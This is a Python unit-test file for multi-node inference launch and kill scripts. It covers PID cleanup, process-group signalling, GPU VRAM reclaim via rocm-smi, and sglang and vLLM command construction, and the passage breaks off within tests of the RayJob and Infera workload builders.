# Copyright Advanced Micro Devices, Inc. All rights reserved.

"""Unit tests for ``multi_node/scripts`` launch and kill helpers.

A tiny ``sys.modules`` ray stub lets CI import the scripts without Ray.
"""

from __future__ import annotations

import argparse
import importlib.util
import json
import os
import signal
import subprocess
import sys
import types
from pathlib import Path

import pytest

from hyperloom.orchestrator.actions.executors import _multi_node_env as mne


def _install_min_ray_stub() -> None:
    """Minimal ``ray`` package graph so script modules can import."""
    if "ray" in sys.modules:
        existing = sys.modules["ray"]
        if getattr(existing, "util", None) is not None:
            return
        if "ray.util" not in sys.modules:
            ray_util_fix = types.ModuleType("ray.util")
            ray_util_fix.get_node_ip_address = lambda: "127.0.0.1"
            sys.modules["ray.util"] = ray_util_fix
        existing.util = sys.modules["ray.util"]
        return

    def _remote_decorator(**_kwargs):
        def _wrap(fn):
            return fn

        return _wrap

    ray_mod = types.ModuleType("ray")
    ray_mod.init = lambda **kwargs: None
    ray_mod.nodes = lambda: []
    ray_mod.remote = _remote_decorator
    ray_mod.get = lambda ref, timeout=None: ref

    ray_util = types.ModuleType("ray.util")
    ray_util.get_node_ip_address = lambda: "127.0.0.1"

    sched = types.ModuleType("ray.util.scheduling_strategies")

    class NodeAffinitySchedulingStrategy:
        def __init__(self, node_id: str, soft: bool = False) -> None:
            self.node_id = node_id
            self.soft = soft

    sched.NodeAffinitySchedulingStrategy = NodeAffinitySchedulingStrategy

    ray_mod.util = ray_util
    sys.modules["ray"] = ray_mod
    sys.modules["ray.util"] = ray_util
    sys.modules["ray.util.scheduling_strategies"] = sched


def _repo_root() -> Path:
    return Path(__file__).resolve().parents[1]


def _load_script_module(unique_name: str, script_name: str):
    _install_min_ray_stub()
    path = _repo_root() / "multi_node" / "scripts" / script_name
    spec = importlib.util.spec_from_file_location(unique_name, path)
    if spec is None or spec.loader is None:
        raise RuntimeError(f"cannot load {path}")
    mod = importlib.util.module_from_spec(spec)
    sys.modules[unique_name] = mod
    spec.loader.exec_module(mod)
    return mod


def test_kill_remote_missing_pid_dir():
    km = _load_script_module("km_test_missing", "kill_multinode.py")
    out = km._kill_remote("/no/such/dir/exists", grace_sec=1)
    assert out == {
        "killed": [],
        "stale": [],
        "missing": [],
        "still_alive": [],
        "ports_busy": [],
        "gpu_busy": [],
    }


def test_kill_remote_non_digit_pid_file_removed(tmp_path):
    km = _load_script_module("km_test_nondigit", "kill_multinode.py")
    d = tmp_path / "pids"
    d.mkdir()
    (d / "rank_0.pid").write_text("not-a-number", encoding="utf-8")
    out = km._kill_remote(str(d), grace_sec=0)
    assert "rank_0.pid" in out["stale"]
    assert not (d / "rank_0.pid").exists()


def test_kill_remote_sentinel_zero_pid_removed(tmp_path):
    km = _load_script_module("km_test_zero", "kill_multinode.py")
    d = tmp_path / "pids"
    d.mkdir()
    (d / "rank_1.pid").write_text("0", encoding="utf-8")
    out = km._kill_remote(str(d), grace_sec=0)
    assert any("rank_1.pid" in s for s in out["stale"])
    assert not (d / "rank_1.pid").exists()


def test_kill_remote_dead_pid_stale(tmp_path, monkeypatch):
    km = _load_script_module("km_test_dead", "kill_multinode.py")
    d = tmp_path / "pids"
    d.mkdir()
    (d / "rank_2.pid").write_text("99999", encoding="utf-8")

    def _kill(pid, sig):
        if sig == 0:
            raise ProcessLookupError()

    monkeypatch.setattr("os.kill", _kill)
    out = km._kill_remote(str(d), grace_sec=0)
    assert any("rank_2.pid" in s for s in out["stale"])
    assert not (d / "rank_2.pid").exists()


def test_kill_remote_sigterms_then_process_exits(tmp_path, monkeypatch):
    km = _load_script_module("km_test_term", "kill_multinode.py")
    d = tmp_path / "pids"
    d.mkdir()
    (d / "rank_0.pid").write_text("4242", encoding="utf-8")

    after_term = {"done": False}

    def _kill(pid, sig):
        if sig == 0:
            if after_term["done"]:
                raise ProcessLookupError()
            return None
        assert pid == 4242

    def _getpgid(pid):
        assert pid == 4242
        return 424200

    def _killpg(pgid, sig):
        assert pgid == 424200
        assert sig in (signal.SIGTERM, signal.SIGKILL)
        if sig == signal.SIGTERM:
            after_term["done"] = True

    monkeypatch.setattr("os.kill", _kill)
    monkeypatch.setattr("os.getpgid", _getpgid)
    monkeypatch.setattr("os.killpg", _killpg)
    monkeypatch.setattr("time.sleep", lambda _s: None)
    # Neutralize the post-kill GPU-VRAM reclaim path so the test never shells
    # out to rocm-smi (primary footprint + fallback per-card both stubbed).
    monkeypatch.setattr(km, "_gpu_total_used_mb", lambda: None)
    monkeypatch.setattr(km, "_gpu_used_mb_for_pgids", lambda _pgids: None)
    monkeypatch.setattr(km, "_gpu_vram_used_mb", lambda: None)

    out = km._kill_remote(str(d), grace_sec=0)
    assert any(x.startswith("rank_0.pid:") for x in out["killed"])
    assert not (d / "rank_0.pid").exists()


# --- GPU VRAM reclaim + zombie detection (teardown must wait for a clean GPU).


class _FakeProc:
    def __init__(self, returncode=0, stdout=""):
        self.returncode = returncode
        self.stdout = stdout


def test_gpu_vram_used_mb_parses_bytes_to_mib(monkeypatch):
    """rocm-smi byte values are converted to MiB (per-card used VRAM only)."""
    km = _load_script_module("km_gpu_parse", "kill_multinode.py")
    payload = {
        "card0": {"VRAM Total Memory (B)": "68702699520", "VRAM Total Used Memory (B)": str(1024 * 1024 * 100)},
        "card1": {"VRAM Total Used Memory (B)": str(1024 * 1024 * 250)},
        "system": {"Driver version": "6.1.4"},  # non-card dict must be ignored
    }
    monkeypatch.setattr(km.subprocess, "run", lambda *a, **k: _FakeProc(0, json.dumps(payload)))
    used = km._gpu_vram_used_mb()
    # Only the "used" keys are picked (not "Total Memory"); bytes -> MiB.
    assert used == [100.0, 250.0]


def test_gpu_vram_used_mb_none_when_rocm_smi_missing(monkeypatch):
    """A missing rocm-smi binary degrades to None (skip the GPU wait)."""
    km = _load_script_module("km_gpu_missing", "kill_multinode.py")

    def _boom(*a, **k):
        raise FileNotFoundError("rocm-smi")

    monkeypatch.setattr(km.subprocess, "run", _boom)
    assert km._gpu_vram_used_mb() is None


def test_gpu_vram_used_mb_none_on_bad_json_or_nonzero(monkeypatch):
    """Non-zero exit, empty stdout, or unparseable JSON all degrade to None."""
    km = _load_script_module("km_gpu_badjson", "kill_multinode.py")
    monkeypatch.setattr(km.subprocess, "run", lambda *a, **k: _FakeProc(1, "boom"))
    assert km._gpu_vram_used_mb() is None
    monkeypatch.setattr(km.subprocess, "run", lambda *a, **k: _FakeProc(0, "   "))
    assert km._gpu_vram_used_mb() is None
    monkeypatch.setattr(km.subprocess, "run", lambda *a, **k: _FakeProc(0, "{not json"))
    assert km._gpu_vram_used_mb() is None


def test_wait_gpu_free_returns_empty_when_below_threshold(monkeypatch):
    """All GPUs under the threshold -> immediately clean (empty list)."""
    km = _load_script_module("km_gpu_free", "kill_multinode.py")
    monkeypatch.setattr(km, "_gpu_vram_used_mb", lambda: [10.0, 20.0])
    assert km._wait_gpu_free(threshold_mb=2048.0, timeout_s=5.0) == []


def test_wait_gpu_free_reports_busy_gpus_at_timeout(monkeypatch):
    """A GPU above the threshold that never drains is reported busy at timeout."""
    km = _load_script_module("km_gpu_busy", "kill_multinode.py")
    monkeypatch.setattr(km, "_gpu_vram_used_mb", lambda: [50.0, 5000.0])
    monkeypatch.setattr(km.time, "sleep", lambda _s: None)
    busy = km._wait_gpu_free(threshold_mb=2048.0, timeout_s=0.0)
    assert busy == [5000.0]


def test_wait_gpu_free_skips_when_rocm_smi_unavailable(monkeypatch):
    """None from rocm-smi -> skip the wait entirely (empty)."""
    km = _load_script_module("km_gpu_skip", "kill_multinode.py")
    monkeypatch.setattr(km, "_gpu_vram_used_mb", lambda: None)
    assert km._wait_gpu_free(threshold_mb=2048.0, timeout_s=999.0) == []


def test_pid_alive_false_for_zombie(monkeypatch, tmp_path):
    """A zombie (state 'Z') counts as gone even though signal-0 succeeds."""
    km = _load_script_module("km_zombie", "kill_multinode.py")
    monkeypatch.setattr("os.kill", lambda _pid, _sig: None)  # signal-0 "alive"
    # comm contains ')' to exercise the rfind-based state parse.
    stat = tmp_path / "stat"
    stat.write_bytes(b"4242 (sglang (rank0)) Z 1 4242 4242 0 -1 0\n")
    real_open = open

    def _fake_open(path, *a, **k):
        if str(path) == "/proc/4242/stat":
            return real_open(stat, *a, **k)
        return real_open(path, *a, **k)

    monkeypatch.setattr("builtins.open", _fake_open)
    assert km._pid_alive(4242) is False


def test_pid_alive_true_for_running(monkeypatch, tmp_path):
    """A running process (state 'R'/'S') is reported alive."""
    km = _load_script_module("km_running", "kill_multinode.py")
    monkeypatch.setattr("os.kill", lambda _pid, _sig: None)
    stat = tmp_path / "stat"
    stat.write_bytes(b"4242 (python3) S 1 4242 4242 0 -1 0\n")
    real_open = open

    def _fake_open(path, *a, **k):
        if str(path) == "/proc/4242/stat":
            return real_open(stat, *a, **k)
        return real_open(path, *a, **k)

    monkeypatch.setattr("builtins.open", _fake_open)
    assert km._pid_alive(4242) is True


def test_gpu_total_used_mb_sums_cards(monkeypatch):
    """Total used VRAM is the per-card sum; None passes through."""
    km = _load_script_module("km_gpu_total", "kill_multinode.py")
    monkeypatch.setattr(km, "_gpu_vram_used_mb", lambda: [284.0, 284.0, 252265.2])
    assert km._gpu_total_used_mb() == 252833.2
    monkeypatch.setattr(km, "_gpu_vram_used_mb", lambda: None)
    assert km._gpu_total_used_mb() is None


def test_gpu_used_mb_for_pgids_attributes_by_process_group(monkeypatch):
    """VRAM is summed only for pids whose process group is ours (child included)."""
    km = _load_script_module("km_gpu_pgids", "kill_multinode.py")
    payload = {
        "system": {
            "PID100": "launcher, 0, 0, 0, unknown",  # our pg leader, no VRAM
            "PID101": "engine, 1, 104857600, 0, unknown",  # child in our pg -> 100 MiB
            "PID900": "other, 1, 209715200, 0, unknown",  # co-tenant, different pg
        }
    }
    monkeypatch.setattr(km.subprocess, "run", lambda *a, **k: _FakeProc(0, json.dumps(payload)))
    pgmap = {100: 50, 101: 50, 900: 90}  # pids 100+101 share pgid 50 (ours)
    monkeypatch.setattr("os.getpgid", lambda pid: pgmap[pid])
    assert km._gpu_used_mb_for_pgids({50}) == 100.0
    # No matching pgid -> 0.0 (attributable, just nothing of ours running yet).
    assert km._gpu_used_mb_for_pgids({999}) == 0.0
    # Empty input short-circuits.
    assert km._gpu_used_mb_for_pgids(set()) == 0.0


def test_gpu_used_mb_for_pgids_none_when_rocm_smi_unavailable(monkeypatch):
    """rocm-smi missing/bad -> None so the caller uses the fallback path."""
    km = _load_script_module("km_gpu_pgids_none", "kill_multinode.py")

    def _boom(*a, **k):
        raise FileNotFoundError("rocm-smi")

    monkeypatch.setattr(km.subprocess, "run", _boom)
    assert km._gpu_used_mb_for_pgids({1}) is None


def test_wait_gpu_reclaimed_returns_none_when_below_target(monkeypatch):
    """Total already at/below target+slack -> clean reclaim (None)."""
    km = _load_script_module("km_reclaim_ok", "kill_multinode.py")
    monkeypatch.setattr(km, "_gpu_total_used_mb", lambda: 3000.0)
    # target 2000 + slack 2048 = 4048 >= 3000 -> None.
    assert km._wait_gpu_reclaimed(2000.0, 2048.0, 5.0) is None


def test_wait_gpu_reclaimed_reports_residual_at_timeout(monkeypatch):
    """Total stuck above target+slack -> residual reported at timeout."""
    km = _load_script_module("km_reclaim_stuck", "kill_multinode.py")
    monkeypatch.setattr(km, "_gpu_total_used_mb", lambda: 260000.0)
    monkeypatch.setattr(km.time, "sleep", lambda _s: None)
    residual = km._wait_gpu_reclaimed(2000.0, 2048.0, 0.0)
    assert residual == 260000.0


def test_wait_gpu_reclaimed_none_when_rocm_smi_unavailable(monkeypatch):
    """rocm-smi unavailable -> skip the wait (None)."""
    km = _load_script_module("km_reclaim_skip", "kill_multinode.py")
    monkeypatch.setattr(km, "_gpu_total_used_mb", lambda: None)
    assert km._wait_gpu_reclaimed(2000.0, 2048.0, 999.0) is None


def _prep_killable_pid_dir(km, monkeypatch, tmp_path, pid=7777, pgid=770000):
    """Create a pid dir with one live-looking pid and stub signals so it 'dies'."""
    d = tmp_path / "pids"
    d.mkdir()
    (d / "rank_0.pid").write_text(str(pid), encoding="utf-8")
    state = {"dead": False}

    def _kill(p, sig):
        if sig == 0:
            if state["dead"]:
                raise ProcessLookupError()
            return None

    def _killpg(pg, sig):
        if sig == signal.SIGTERM:
            state["dead"] = True

    monkeypatch.setattr("os.kill", _kill)
    monkeypatch.setattr("os.getpgid", lambda _p: pgid)
    monkeypatch.setattr("os.killpg", _killpg)
    monkeypatch.setattr("time.sleep", lambda _s: None)
    return d


def test_kill_remote_primary_reclaim_when_footprint_known(monkeypatch, tmp_path):
    """When our footprint is attributable, the workload-scoped reclaim wait runs."""
    km = _load_script_module("km_primary", "kill_multinode.py")
    d = _prep_killable_pid_dir(km, monkeypatch, tmp_path)
    monkeypatch.setattr(km, "_gpu_total_used_mb", lambda: 260000.0)
    monkeypatch.setattr(km, "_gpu_used_mb_for_pgids", lambda _pgids: 250000.0)
    calls = {"primary": 0, "fallback": 0}

    def _reclaim(target, slack, timeout):
        calls["primary"] += 1
        assert timeout == 120.0  # primary uses gpu_free_timeout_s default
        return None

    monkeypatch.setattr(km, "_wait_gpu_reclaimed", _reclaim)
    monkeypatch.setattr(km, "_wait_gpu_free", lambda *a: calls.__setitem__("fallback", calls["fallback"] + 1) or [])
    out = km._kill_remote(str(d), grace_sec=0)
    assert calls == {"primary": 1, "fallback": 0}
    assert out["gpu_busy"] == []


def test_kill_remote_fallback_45s_when_footprint_unknown(monkeypatch, tmp_path):
    """When footprint can't be attributed, fall back to the 45s per-card wait."""
    km = _load_script_module("km_fallback", "kill_multinode.py")
    d = _prep_killable_pid_dir(km, monkeypatch, tmp_path)
    monkeypatch.setattr(km, "_gpu_total_used_mb", lambda: None)  # rocm-smi unavailable
    monkeypatch.setattr(km, "_gpu_used_mb_for_pgids", lambda _pgids: None)
    seen = {}

    def _fallback(threshold, timeout):
        seen["threshold"] = threshold
        seen["timeout"] = timeout
        return []

    monkeypatch.setattr(km, "_wait_gpu_free", _fallback)
    monkeypatch.setattr(km, "_wait_gpu_reclaimed", lambda *a: pytest.fail("primary must not run"))
    km._kill_remote(str(d), grace_sec=0)
    assert seen == {"threshold": 2048.0, "timeout": 45.0}


def test_pd_decode_dist_init_port_derives_from_prefill():
    """PD-disaggregated decode rendezvous port = prefill port + 1, so an operator override shifts both in lock-step."""
    lm = _load_script_module("lm_test_pd_decode_port", "launch_multinode.py")
    assert lm._pd_decode_dist_init_port(lm._DEFAULT_DIST_INIT_PORT) == 29501
    assert lm._pd_decode_dist_init_port(29501) == 29502
    assert lm._pd_decode_dist_init_port(40000) == 40001
    # Hard-coded constant must NOT come back (regression guard).
    assert not hasattr(lm, "_PD_DECODE_DIST_INIT_PORT"), (
        "_PD_DECODE_DIST_INIT_PORT was reintroduced — decode port must "
        "derive from args.dist_init_port + 1, not a separate constant, "
        "or override of $RAYJOB_DIST_INIT_PORT silently collides."
    )


def test_build_sglang_cmd_head_has_host_port():
    lm = _load_script_module("lm_test_sglang_head", "launch_multinode.py")
    cmd = lm._build_sglang_cmd(
        model="/m",
        tp=2,
        nnodes=2,
        node_rank=0,
        dist_init_addr="10.0.0.1:5000",
        extra_args=["--x"],
    )
    assert "--host" in cmd and "--port" in cmd
    assert cmd[cmd.index("--port") + 1] == "8888"
    assert "--x" in cmd


def test_build_sglang_cmd_worker_omits_http_bind():
    lm = _load_script_module("lm_test_sglang_worker", "launch_multinode.py")
    cmd = lm._build_sglang_cmd(
        model="/m",
        tp=2,
        nnodes=2,
        node_rank=1,
        dist_init_addr="10.0.0.1:5000",
        extra_args=[],
    )
    assert "--host" not in cmd
    assert "--port" not in cmd


def test_build_vllm_cmd_includes_ray_backend():
    lm = _load_script_module("lm_test_vllm", "launch_multinode.py")
    cmd = lm._build_vllm_cmd(model="/m", tp=16, extra_args=["--enforce-eager"])
    assert cmd[0] == "vllm"
    assert "--distributed-executor-backend" in cmd
    assert cmd[cmd.index("--tensor-parallel-size") + 1] == "16"
    assert "--enforce-eager" in cmd


def test_subprocess_env_prepends_venv_bin(monkeypatch):
    lm = _load_script_module("lm_test_env", "launch_multinode.py")
    monkeypatch.setenv("PATH", "/usr/bin:/bin")
    env = lm._subprocess_env()
    assert env["PATH"].startswith("/opt/venv/bin:")


def test_subprocess_env_idempotent_if_already_first(monkeypatch):
    lm = _load_script_module("lm_test_env2", "launch_multinode.py")
    monkeypatch.setenv("PATH", "/opt/venv/bin:/usr/bin")
    env = lm._subprocess_env()
    assert env["PATH"].startswith("/opt/venv/bin")
    assert env["PATH"].count("/opt/venv/bin") == 1


def test_detach_framework_launch_starts_sleep(tmp_path):
    lm = _load_script_module("lm_test_detach_sleep", "launch_multinode.py")
    log_f = tmp_path / "r0.log"
    pid_f = tmp_path / "r0.pid"
    env = dict(os.environ)
    env["PYTHONUNBUFFERED"] = "1"
    pid = lm._detach_framework_launch(
        ["sleep", "60"],
        log_f,
        pid_f,
        env,
        node_rank=0,
    )
    assert int(pid_f.read_text(encoding="utf-8").strip()) == pid
    os.kill(pid, 0)
    os.kill(pid, signal.SIGTERM)


def test_detach_framework_launch_raises_on_immediate_exit(tmp_path):
    lm = _load_script_module("lm_test_detach_false", "launch_multinode.py")
    log_f = tmp_path / "r0.log"
    pid_f = tmp_path / "r0.pid"
    env = dict(os.environ)
    env["PYTHONUNBUFFERED"] = "1"
    try:
        lm._detach_framework_launch(
            ["sh", "-c", "exit 42"],
            log_f,
            pid_f,
            env,
            node_rank=0,
        )
    except RuntimeError as exc:
        assert "immediately" in str(exc).lower() or "not alive" in str(exc).lower()
    else:
        raise AssertionError("expected RuntimeError")


def test_pick_head_first_orders_local_first(monkeypatch):
    lm = _load_script_module("lm_test_pick", "launch_multinode.py")
    monkeypatch.setattr(
        lm.ray.util,
        "get_node_ip_address",
        lambda: "10.0.0.1",
    )
    nodes = [
        {"NodeManagerAddress": "10.0.0.2", "NodeID": "b"},
        {"NodeManagerAddress": "10.0.0.1", "NodeID": "a"},
    ]
    ordered = lm._pick_head_first(nodes)
    assert ordered[0]["NodeManagerAddress"] == "10.0.0.1"
    assert ordered[1]["NodeManagerAddress"] == "10.0.0.2"


def test_pick_head_first_fallback_sorts_when_local_missing(monkeypatch):
    lm = _load_script_module("lm_test_pick2", "launch_multinode.py")
    monkeypatch.setattr(
        lm.ray.util,
        "get_node_ip_address",
        lambda: "192.168.99.99",
    )
    nodes = [
        {"NodeManagerAddress": "10.0.0.2", "NodeID": "b"},
        {"NodeManagerAddress": "10.0.0.1", "NodeID": "a"},
    ]
    ordered = lm._pick_head_first(nodes)
    addrs = [n["NodeManagerAddress"] for n in ordered]
    assert addrs == sorted(addrs)


def test_wait_for_nodes_returns_when_enough_gpu_nodes(monkeypatch):
    lm = _load_script_module("lm_test_wait_ok", "launch_multinode.py")
    sample = [
        {"Alive": True, "Resources": {"GPU": 1.0}},
        {"Alive": True, "Resources": {"GPU": 1.0}},
    ]
    monkeypatch.setattr(lm.ray, "nodes", lambda: sample)
    monkeypatch.setattr(lm.time, "sleep", lambda _s: None)
    got = lm._wait_for_nodes(2, timeout_s=10)
    assert len(got) == 2


def test_wait_for_nodes_times_out(monkeypatch):
    lm = _load_script_module("lm_test_wait_to", "launch_multinode.py")
    one = [{"Alive": True, "Resources": {"GPU": 1.0}}]
    monkeypatch.setattr(lm.ray, "nodes", lambda: one)
    monkeypatch.setattr(lm.time, "sleep", lambda _s: None)
    times = iter([0.0, 0.0, 200.0])

    def _mono():
        return next(times)

    monkeypatch.setattr(lm.time, "monotonic", _mono)
    try:
        lm._wait_for_nodes(3, timeout_s=120)
    except RuntimeError as exc:
        assert "only 1/3" in str(exc)
    else:
        raise AssertionError("expected RuntimeError")


def test_launch_main_rejects_nnodes_below_two(monkeypatch):
    lm = _load_script_module("lm_test_main_nnodes", "launch_multinode.py")
    monkeypatch.setattr(
        sys,
        "argv",
        [
            "launch_multinode.py",
            "--framework",
            "sglang",
            "--model",
            "/m",
            "--tp",
            "1",
            "--nnodes",
            "1",
            "--pid-dir",
            "/tmp",
            "--log-dir",
            "/tmp",
        ],
    )
    assert lm.main() == 2


def test_spawn_remote_vllm_worker_writes_sentinel_pid(tmp_path):
    lm = _load_script_module("lm_test_spawn_vllm", "launch_multinode.py")
    pid_dir = tmp_path / "p"
    log_dir = tmp_path / "l"
    rc = lm._spawn_remote(
        framework="vllm",
        model="/m",
        tp=8,
        nnodes=2,
        node_rank=1,
        head_ip="127.0.0.1",
        dist_init_port=5000,
        pid_dir=str(pid_dir),
        log_dir=str(log_dir),
        extra_args=[],
    )
    assert rc == 0
    assert (pid_dir / "rank_1.pid").read_text(encoding="utf-8") == "0"


def test_wait_health_true_on_200(monkeypatch):
    lm = _load_script_module("lm_test_health", "launch_multinode.py")
    calls = {"n": 0}

    class _Resp:
        status = 200

        def __enter__(self):
            return self

        def __exit__(self, *_args):
            return False

    def _urlopen(*_a, **_k):
        calls["n"] += 1
        return _Resp()

    monkeypatch.setattr(
        "urllib.request.urlopen",
        _urlopen,
    )
    monkeypatch.setattr(lm.time, "sleep", lambda _s: None)
    assert lm._wait_health(timeout_s=30) is True
    assert calls["n"] == 1


def test_wait_health_false_on_timeout(monkeypatch):
    lm = _load_script_module("lm_test_health2", "launch_multinode.py")

    def _urlopen(*_a, **_k):
        raise OSError("down")

    monkeypatch.setattr("urllib.request.urlopen", _urlopen)
    monkeypatch.setattr(lm.time, "sleep", lambda _s: None)
    times = iter([0.0, 100.0])

    def _mono():
        return next(times)

    monkeypatch.setattr(lm.time, "monotonic", _mono)
    assert lm._wait_health(timeout_s=5) is False


def test_find_head_pod_ip_prefers_kuberay_head_suffix():
    """SaFE may list submitter as resourceId 0; real Ray head podId contains '-head-'."""
    from hyperloom.inference_optimizer.multi_node.commands import rayjob as mn_rayjob

    wl = {
        "pods": [
            {
                "podId": "primus-claw-40290b670f98c7-twr9t-khlfj",
                "resourceId": 0,
                "podIP": "172.16.152.122",
            },
            {
                "podId": "primus-claw-40290b670f98c7-twr9t-x6fkf-head-ddtvg",
                "resourceId": 1,
                "podIP": "192.0.2.77",
            },
        ],
    }
    assert mn_rayjob._find_head_pod_ip(wl) == "192.0.2.77"


def test_find_head_pod_ip_fallback_resource_id_zero():
    from hyperloom.inference_optimizer.multi_node.commands import rayjob as mn_rayjob

    wl = {
        "pods": [
            {"podId": "legacy-pod", "resourceId": 0, "podIP": "10.0.0.1"},
        ],
    }
    assert mn_rayjob._find_head_pod_ip(wl) == "10.0.0.1"


def test_build_rayjob_entrypoints_empty_submitter_tail():
    import base64

    from hyperloom.inference_optimizer.multi_node._internal import workload_spec

    b = workload_spec.build_rayjob_workload_body(
        workspace="example-hyperloom",
        display_name="t",
        image="harbor.example/sglang:1",
        nodes=2,
        gpus_per_node=8,
        cpus_per_node=96,
        mem_gi_per_node=1024,
        ephemeral_gi_per_node=400,
    )
    assert b["entryPoints"] == ["", ""]
    dec = base64.b64decode(b["env"]["RAY_JOB_ENTRYPOINT"]).decode().strip()
    assert dec == "tail -f /dev/null"


# Common kwargs for builder tests; keeps each test focused on the one field under test.
_BUILDER_MIN_KWARGS = dict(
    workspace="ws-a",
    display_name="t",
    image="img:1",
    nodes=2,
    gpus_per_node=8,
    cpus_per_node=96,
    mem_gi_per_node=1024,
    ephemeral_gi_per_node=400,
)


def test_extra_env_rayjob_long_lived_passthrough():
    # User-supplied RAYJOB_LONG_LIVED reaches body.env unchanged.
    from hyperloom.inference_optimizer.multi_node._internal import workload_spec

    b = workload_spec.build_rayjob_workload_body(
        extra_env={"RAYJOB_LONG_LIVED": "true", "NCCL_DEBUG": "INFO"},
        **_BUILDER_MIN_KWARGS,
    )
    assert b["env"].get("RAYJOB_LONG_LIVED") == "true"
    assert b["env"].get("NCCL_DEBUG") == "INFO"


def test_extra_env_ray_job_entrypoint_still_stripped_and_forced():
    # RAY_JOB_ENTRYPOINT is reserved: the builder overwrites it with base64("tail -f /dev/null") so the cluster lives the whole session.
    import base64

    from hyperloom.inference_optimizer.multi_node._internal import workload_spec

    b = workload_spec.build_rayjob_workload_body(
        extra_env={"RAY_JOB_ENTRYPOINT": base64.b64encode(b"echo hi").decode()},
        **_BUILDER_MIN_KWARGS,
    )
    decoded = base64.b64decode(b["env"]["RAY_JOB_ENTRYPOINT"]).decode().strip()
    assert decoded == "tail -f /dev/null"


def test_session_id_injects_primus_claw_label():
    # session_id emits the primus-claw/session-id label so Brain can correlate the RayJob with its parent session.
    from hyperloom.inference_optimizer.multi_node._internal import workload_spec

    b = workload_spec.build_rayjob_workload_body(
        session_id="sess-123",
        **_BUILDER_MIN_KWARGS,
    )
    assert b["labels"].get("primus-claw/session-id") == "sess-123"
    # The builder writes no primus-safe.* labels.
    assert not any(k.startswith("primus-safe.") for k in b["labels"])


def test_session_id_omitted_skips_label():
    # No session_id → the label is absent rather than written with an empty value.
    from hyperloom.inference_optimizer.multi_node._internal import workload_spec

    b_none = workload_spec.build_rayjob_workload_body(
        session_id=None,
        **_BUILDER_MIN_KWARGS,
    )
    b_empty = workload_spec.build_rayjob_workload_body(
        session_id="",
        **_BUILDER_MIN_KWARGS,
    )
    b_default = workload_spec.build_rayjob_workload_body(**_BUILDER_MIN_KWARGS)
    for b in (b_none, b_empty, b_default):
        assert "primus-claw/session-id" not in b["labels"]


def test_extra_label_primus_claw_prefix_still_stripped():
    # The reserved-namespace guard for extra_labels stays intact: users can't inject their own session-id.
    from hyperloom.inference_optimizer.multi_node._internal import workload_spec

    b = workload_spec.build_rayjob_workload_body(
        session_id="real-sess",
        extra_labels={
            "primus-claw/session-id": "spoofed",  # must be dropped
            "custom.example/team": "infra",  # must survive
        },
        **_BUILDER_MIN_KWARGS,
    )
    # Builder-injected value wins; user spoof is dropped before merge.
    assert b["labels"].get("primus-claw/session-id") == "real-sess"
    # Non-reserved labels survive unchanged.
    assert b["labels"].get("custom.example/team") == "infra"


# ---------------------------------------------------------------------------
# build_infera_workload_body tests (Infera idle-pod backend).

_INFERA_MIN_KWARGS = dict(
    workspace="ws-a",
    display_name="t",
    image="img:1-ssh",
    model="/path/models/GLM-5.2-FP8",
    nodes=2,
    gpus_per_node=8,
    cpus_per_node=96,
    mem_gi_per_node=1024,
    ephemeral_gi_per_node=400,
    ssh_authorized_key="ssh-ed25519 AAAAC3xx mn",
)


def test_infera_body_multinode_idle_shape():
    # Multi-node Infera body: InferaDeployment kind, [frontend, worker]
    # resources, worker.replica == node count, multinodeRoles=["worker"],
    # idle worker entryPoint, frontend on :8000.
    import base64

    from hyperloom.inference_optimizer.multi_node._internal import workload_spec

    b = workload_spec.build_infera_workload_body(**_INFERA_MIN_KWARGS)

    assert b["groupVersionKind"] == {"kind": "InferaDeployment", "version": "v1"}
    assert b["inferaOptions"]["serviceRoles"] == ["frontend", "worker"]
    assert b["inferaOptions"]["multinodeRoles"] == ["worker"]
    assert b["inferaOptions"]["backendFramework"] == "sglang"
    assert b["inferaOptions"]["kvTransferBackend"] == "mori"

    fe, worker = b["resources"]
    assert fe["replica"] == 1 and "gpu" not in fe
    # worker.replica IS the node count (new API), not a Deployment replica.
    assert worker["replica"] == 2
    assert worker["gpu"] == "8"
    assert worker["sharedMemory"] == "200Gi"
    assert worker["rdmaResource"] == "1"  # cross-node RDMA on multi-node

    # entryPoints are base64; worker is the idle launcher, frontend is :8000.
    fe_ep = base64.b64decode(b["entryPoints"][0]).decode()
    wk_ep = base64.b64decode(b["entryPoints"][1]).decode()
    assert "infera.server" in fe_ep and "--port 8000" in fe_ep
    assert "--router-tokenizer-path /path/models/GLM-5.2-FP8" in fe_ep
    assert "MN_SSH_PORT" in wk_ep and "mn-idle.sh" in wk_ep

    # SSH control-plane env injected; service fronts :8000 (not sglang :8888).
    assert b["env"]["MN_SSH_AUTHORIZED_KEY"] == "ssh-ed25519 AAAAC3xx mn"
    assert b["env"]["MN_SSH_PORT"] == "2222"
    assert b["service"]["port"] == 8000 and b["service"]["targetPort"] == 8000


def test_infera_body_single_node_omits_multinode_and_rdma():
    # nodes=1: no multinodeRoles, no rdmaResource (single-pod aggregated).
    from hyperloom.inference_optimizer.multi_node._internal import workload_spec

    kw = dict(_INFERA_MIN_KWARGS)
    kw["nodes"] = 1
    b = workload_spec.build_infera_workload_body(**kw)

    assert "multinodeRoles" not in b["inferaOptions"]
    _, worker = b["resources"]
    assert worker["replica"] == 1
    assert "rdmaResource" not in worker


def test_infera_body_requires_ssh_key():
    # The idle-pod control plane is unreachable without an authorized key,
    # so the builder fails fast rather than producing a dead deployment.
    import pytest as _pytest

    from hyperloom.inference_optimizer.multi_node._internal import workload_spec

    kw = dict(_INFERA_MIN_KWARGS)
    kw["ssh_authorized_key"] = "   "
    with _pytest.raises(ValueError, match="ssh_authorized_key"):
        workload_spec.build_infera_workload_body(**kw)


def test_infera_body_requires_model():
    import pytest as _pytest

    from hyperloom.inference_optimizer.multi_node._internal import workload_spec

    kw = dict(_INFERA_MIN_KWARGS)
    kw["model"] = "   "
    with _pytest.raises(ValueError, match="model is required"):
        workload_spec.build_infera_workload_body(**kw)


def test_infera_body_rejects_bad_enums():
    import pytest as _pytest

    from hyperloom.inference_optimizer.multi_node._internal import workload_spec

    with _pytest.raises(ValueError, match="backend_framework"):
        workload_spec.build_infera_workload_body(
            **{**_INFERA_MIN_KWARGS, "backend_framework": "tensorrt"},
        )
    with _pytest.raises(ValueError, match="kv_transfer_backend"):
        workload_spec.build_infera_workload_body(
            **{**_INFERA_MIN_KWARGS, "kv_transfer_backend": "rdma"},
        )


def test_infera_body_pd_independent_instances_no_multinode():
    # PD with TP that fits one pod (tp <= gpus_per_node): prefill/decode are
    # independent single-node instances -> NO multinodeRoles, but PD still
    # carries rdmaResource for the cross-pod KV transfer plane.
    # Matches the canonical PD body (replica=2, TP=8).
